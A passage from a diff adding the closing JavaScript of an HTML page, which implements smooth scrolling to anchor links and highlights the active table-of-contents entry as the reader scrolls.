+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({
+                        behavior: 'smooth',
+                        block: 'start'
+                    });
+                }
+            });
+        });
+        
+        // Highlight active section in TOC
+        function updateActiveSection() {
+            const sections = document.querySelectorAll('h5[id]');
+            const tocLinks = document.querySelectorAll('.sticky-sidebar a[href^="#"]');
+            
+            let currentSection = '';
+            sections.forEach(section => {
+                const rect = section.getBoundingClientRect();
+                if (rect.top <= 100) {
+                    currentSection = section.getAttribute('id');
+                }
+            });
+            
+            tocLinks.forEach(link => {
+                link.classList.remove('active');
+                if (link.getAttribute('href') === '#' + currentSection) {
+                    link.classList.add('active');
+                }
+            });
+        }
+        
+        // Update active section on scroll
+        window.addEventListener('scroll', updateActiveSection);
+        updateActiveSection(); // Initial call
+    </script>
+</body>
+
+</html>
